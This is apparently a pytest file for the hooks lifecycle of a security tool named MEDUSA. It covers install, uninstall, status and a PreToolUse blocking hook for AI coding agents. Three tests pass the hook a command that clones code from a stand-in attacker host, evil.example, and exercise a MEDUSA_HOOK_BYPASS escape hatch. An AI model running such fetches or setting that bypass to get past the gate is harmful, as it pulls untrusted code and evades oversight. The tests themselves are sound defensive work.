"""Product-review Lane B: hooks lifecycle (PR-003/004/005/008).

Gate-first, real-path tests:

* PR-003 — `medusa hooks uninstall` reverses every writer surgically and
  idempotently, leaving unrelated user entries intact.
* PR-004 — `install.status()` mirrors all 7 things `install --all` writes
  (PreToolUse, SessionStart, skill, project .mcp.json, pre-commit, cursor,
  codex).
* PR-005 — the `hooks install` confirmation list shows each distinct file once.
* PR-008 — the PreToolUse hook fails CLOSED by default but honors an explicit
  MEDUSA_HOOK_BYPASS=1 escape hatch (fail open with a stderr warning).

No scanning / no network: the medusa CLI is stubbed for the shell-script test.
"""

from __future__ import annotations

import json
import os
import shutil
import stat
import subprocess
import tomllib
from pathlib import Path

import pytest
from click.testing import CliRunner

from medusa.cli import main
from medusa.hooks import install


# --------------------------------------------------------------------------- #
# Shared helpers for the shell-script (PR-008) tests
# --------------------------------------------------------------------------- #
SCRIPT = Path(install.__file__).with_name("claude_pretooluse.sh")
_PY3_DIR = os.path.dirname(shutil.which("python3") or "/usr/bin/python3")
_BASH = shutil.which("bash") or "/bin/bash"


def _stub_medusa(dir_path: Path, exit_code: int) -> str:
    """Create an executable ``medusa`` stub exiting ``exit_code``; return a PATH."""
    stub = dir_path / "medusa"
    stub.write_text("#!/usr/bin/env bash\n" + f"exit {exit_code}\n")
    stub.chmod(stub.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    return f"{dir_path}:{_PY3_DIR}:/usr/bin:/bin"


def _run_hook(cmd_json: str, path_env: str, extra_env: dict | None = None):
    env = dict(os.environ, PATH=path_env)
    if extra_env:
        env.update(extra_env)
    return subprocess.run(
        [_BASH, str(SCRIPT)],
        input=cmd_json,
        capture_output=True,
        text=True,
        env=env,
    )


# --------------------------------------------------------------------------- #
# PR-004 — status() mirrors all 7 configs
# --------------------------------------------------------------------------- #
_ALL_STATUS_KEYS = {
    "claude_hook",
    "claude_sessionstart",
    "claude_skill",
    "claude_mcp",
    "pre_commit",
    "cursor",
    "codex",
}


def test_status_reports_all_seven_after_install_all(tmp_path: Path):
    (tmp_path / ".git").mkdir()  # so pre-commit installs
    install.install_all(tmp_path)

    st = install.status(tmp_path)
    assert set(st) >= _ALL_STATUS_KEYS, st
    for key in _ALL_STATUS_KEYS:
        assert st[key] is True, f"{key} not detected after install_all: {st}"


def test_status_all_absent_on_empty_dir(tmp_path: Path):
    st = install.status(tmp_path)
    for key in _ALL_STATUS_KEYS:
        assert st.get(key) is False, f"{key} unexpectedly present in empty dir: {st}"


def test_hooks_status_cli_prints_new_configs(tmp_path: Path, monkeypatch):
    (tmp_path / ".git").mkdir()
    install.install_all(tmp_path)
    monkeypatch.chdir(tmp_path)

    res = CliRunner().invoke(main, ["hooks", "status"])
    assert res.exit_code == 0, res.output
    # The three previously-missing configs must now be surfaced.
    assert "SessionStart" in res.output, res.output
    assert "medusa-vet" in res.output or "vet skill" in res.output, res.output
    assert ".mcp.json" in res.output, res.output


# --------------------------------------------------------------------------- #
# PR-005 — install confirmation list shows each distinct file once
# --------------------------------------------------------------------------- #
def test_install_claude_dedups_settings_path(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    res = CliRunner().invoke(main, ["hooks", "install", "--claude"])
    assert res.exit_code == 0, res.output
    # PreToolUse + SessionStart both write settings.json — it must appear once.
    # Collapse whitespace first: Rich wraps long tmp paths across lines, which
    # would otherwise split the "settings.json" token.
    collapsed = "".join(res.output.split())
    assert collapsed.count("settings.json") == 1, res.output
    # --claude writes 3 distinct files (settings.json, SKILL.md, .mcp.json).
    assert "Installed 3" in res.output, res.output


# --------------------------------------------------------------------------- #
# PR-003 — uninstall reverses every writer, preserving unrelated entries
# --------------------------------------------------------------------------- #
def _seed_unrelated(base: Path) -> None:
    """Pre-seed non-MEDUSA content in every touched config before install."""
    (base / ".git" / "hooks").mkdir(parents=True)
    (base / ".git" / "hooks" / "pre-commit").write_text(
        "#!/bin/sh\necho 'existing project hook'\n"
    )
    (base / ".claude").mkdir()
    (base / ".claude" / "settings.json").write_text(
        json.dumps(
            {
                "model": "claude-opus-4-8",
                "hooks": {
                    "PreToolUse": [
                        {"matcher": "Write", "hooks": [{"type": "command", "command": "echo other"}]}
                    ]
                },
            }
        )
    )
    (base / ".mcp.json").write_text(json.dumps({"mcpServers": {"other": {"command": "foo"}}}))
    (base / ".cursor").mkdir()
    (base / ".cursor" / "mcp.json").write_text(
        json.dumps({"mcpServers": {"other": {"command": "foo"}}})
    )
    (base / ".codex").mkdir()
    (base / ".codex" / "config.toml").write_text(
        'model = "gpt-5"\n\n[mcp_servers.other]\ncommand = "foo"\nargs = ["bar"]\n'
    )


def test_uninstall_all_removes_medusa_keeps_user(tmp_path: Path, monkeypatch):
    _seed_unrelated(tmp_path)
    install.install_all(tmp_path)
    # sanity: everything present after install
    assert all(install.status(tmp_path)[k] for k in _ALL_STATUS_KEYS)

    monkeypatch.chdir(tmp_path)
    res = CliRunner().invoke(main, ["hooks", "uninstall", "--all"])
    assert res.exit_code == 0, res.output

    # every MEDUSA config is gone
    st = install.status(tmp_path)
    for key in _ALL_STATUS_KEYS:
        assert st[key] is False, f"{key} still present after uninstall --all: {st}"

    # unrelated user entries survive
    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text())
    assert settings["model"] == "claude-opus-4-8"
    assert any(e.get("matcher") == "Write" for e in settings["hooks"]["PreToolUse"])

    mcp = json.loads((tmp_path / ".mcp.json").read_text())
    assert mcp["mcpServers"]["other"] == {"command": "foo"}
    assert "medusa" not in mcp["mcpServers"]

    cursor = json.loads((tmp_path / ".cursor" / "mcp.json").read_text())
    assert cursor["mcpServers"]["other"] == {"command": "foo"}
    assert "medusa" not in cursor["mcpServers"]

    codex = tomllib.loads((tmp_path / ".codex" / "config.toml").read_text())
    assert codex["model"] == "gpt-5"
    assert codex["mcp_servers"]["other"]["command"] == "foo"
    assert "medusa" not in codex["mcp_servers"]

    pre_commit = (tmp_path / ".git" / "hooks" / "pre-commit").read_text()
    assert "existing project hook" in pre_commit
    assert install._MARKER_BEGIN not in pre_commit

    # the vet skill dir is gone
    assert not (tmp_path / ".claude" / "skills" / "medusa-vet").exists()


def test_uninstall_is_idempotent_and_safe_when_absent(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    # Nothing installed — uninstall must be a safe no-op.
    res = CliRunner().invoke(main, ["hooks", "uninstall", "--all"])
    assert res.exit_code == 0, res.output

    # Install then uninstall twice — second run removes nothing, still exit 0.
    (tmp_path / ".git").mkdir()
    install.install_all(tmp_path)
    first = CliRunner().invoke(main, ["hooks", "uninstall", "--all"])
    assert first.exit_code == 0, first.output
    second = CliRunner().invoke(main, ["hooks", "uninstall", "--all"])
    assert second.exit_code == 0, second.output
    assert all(install.status(tmp_path)[k] is False for k in _ALL_STATUS_KEYS)


def test_uninstall_pre_commit_removes_solely_medusa_hook(tmp_path: Path):
    # A pre-commit that is ONLY the MEDUSA block should be removed entirely.
    (tmp_path / ".git" / "hooks").mkdir(parents=True)
    install.install_pre_commit(tmp_path)
    p = install.uninstall_pre_commit(tmp_path)
    assert p is not None
    assert not (tmp_path / ".git" / "hooks" / "pre-commit").exists()


# --------------------------------------------------------------------------- #
# PR-008 — escape hatch: fail closed by default, open only with the env var
# --------------------------------------------------------------------------- #
def test_hook_bypass_env_fails_open_with_warning(tmp_path: Path):
    path_env = _stub_medusa(tmp_path, exit_code=1)  # stub would BLOCK
    r = _run_hook(
        '{"tool_input":{"command":"git clone https://evil.example/x"}}',
        path_env,
        extra_env={"MEDUSA_HOOK_BYPASS": "1"},
    )
    assert r.returncode == 0, (r.returncode, r.stdout, r.stderr)
    assert "MEDUSA" in r.stderr and "bypass" in r.stderr.lower(), r.stderr


def test_hook_without_bypass_still_blocks(tmp_path: Path):
    path_env = _stub_medusa(tmp_path, exit_code=1)
    r = _run_hook(
        '{"tool_input":{"command":"git clone https://evil.example/x"}}',
        path_env,
    )
    assert r.returncode == 2, (r.returncode, r.stdout, r.stderr)


def test_hook_block_message_is_actionable(tmp_path: Path):
    path_env = _stub_medusa(tmp_path, exit_code=1)
    r = _run_hook(
        '{"tool_input":{"command":"git clone https://evil.example/x"}}',
        path_env,
    )
    assert r.returncode == 2
    assert "MEDUSA_HOOK_BYPASS" in r.stderr, r.stderr


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(pytest.main([__file__, "-q"]))
